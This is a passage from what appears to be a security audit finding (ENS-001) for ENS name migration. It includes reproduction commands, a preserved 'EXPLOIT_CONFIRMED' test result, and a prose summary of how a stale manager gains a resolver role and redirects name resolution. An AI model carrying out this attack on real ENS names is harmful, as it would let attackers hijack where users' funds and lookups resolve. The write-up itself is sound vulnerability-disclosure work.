find "$POC_DIR/reproduction-test-results" -type f -name trace.zip \
  -exec cp {} "$POC_DIR/ENS-001-reproduction-trace.zip" \;
test -s "$POC_DIR/ENS-001-reproduction-trace.zip"

cd "$POC_DIR"
./node_modules/.bin/vitest run --config HYP-010.vitest.config.ts
```

{% endstep %}

{% step %}

## Stop the local infrastructure

After review, stop only the infrastructure started for this reproduction:

```sh
cd ../audit-comp-ens
pnpm e2e:infra:down
```

These commands write a new Playwright JSON report and copy the newly generated trace to distinct reproduction filenames, so the preserved Gist evidence and `SHA256SUMS` remain unchanged. `RUN.md` contains the same complete reproduction procedure.
{% endstep %}
{% endstepper %}

### Preserved result

The exact-snapshot browser run recorded:

```
Playwright: 1 expected, 0 unexpected, 35.99 seconds
```

Its `EXPLOIT_CONFIRMED` output included these relevant fields:

```json
{
  "finding": "ENS-001",
  "result": "EXPLOIT_CONFIRMED",
  "name": "fgeorgescu.eth",
  "victim": "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266",
  "staleManager": "0x70997970C51812dc3A010C7d01b50e0d17dc79C8",
  "liveManager": "0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC",
  "redirectRecipient": "0x90F79bf6EB2c4f870365E785982E1f101E93b906",
  "hcaOuterTransaction": "0x55f6525e0935ed68e7dd598295220f53da194eecf27a9da58ac9c609589f0357",
  "freshV1CacheManager": "0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC",
  "staleGasPlanManager": "0x70997970C51812dc3A010C7d01b50e0d17dc79C8",
  "namesRequestCount": 5,
  "freshBResponseDelivered": true,
  "staleGrantCount": 1,
  "liveGrantCount": 0
}
```

The supporting run recorded:

```
Test Files  2 passed (2)
Tests       4 passed (4)
Duration    5.38s
```

In one continuous execution, the browser E2E proves:

1. V owns the registration; after V's signed reclaim, B is live, A lacks usable V1 authority over the victim name, and both A and B have zero target V2 role bits before migration.
2. The fresh application cache contains B while the production gas plan contains A; the confirmation UI does not disclose either address.
3. V uses the real Manager migration flow, and the successful victim-signed transaction to the HCA address captured from the production gas plan grants A exactly once and B zero times.
4. V remains V2 owner and temporary HCA approval is removed, while A's newly created per-name resolver role persists.
5. A exercises that role on-chain to install its genuine resolver, after which Universal Resolver returns attacker-selected address R.

These results prove exploit reachability when the demonstrated stale-to-fresh ordering occurs. They do not measure natural production incidence or claim that every migration is affected.

### Evidence identifiers

| Evidence                                            | Value                                                                |
| --------------------------------------------------- | -------------------------------------------------------------------- |
| HCA outer transaction                               | `0x55f6525e0935ed68e7dd598295220f53da194eecf27a9da58ac9c609589f0357` |
| Secret Gist commit                                  | `66be3a13b973efc97fb8bbc85b9ad7be21ff8c82`                           |
| E2E source SHA-256                                  | `db41061bdebce7fd028a80bae8d0bbc7fff7e36ae7e18e775777a6a2060f4638`   |
| Playwright JSON SHA-256                             | `88b8e2ff32a6484949bfc0dadd62c9f463d0c9c008731b4b9f732a4f3e91cbd5`   |
| Supplemental Playwright trace SHA-256 (not in Gist) | `5d6e360a54c0d91ca44e3656474bf9176e23a47d95ade0aed994d23be5d0114c`   |
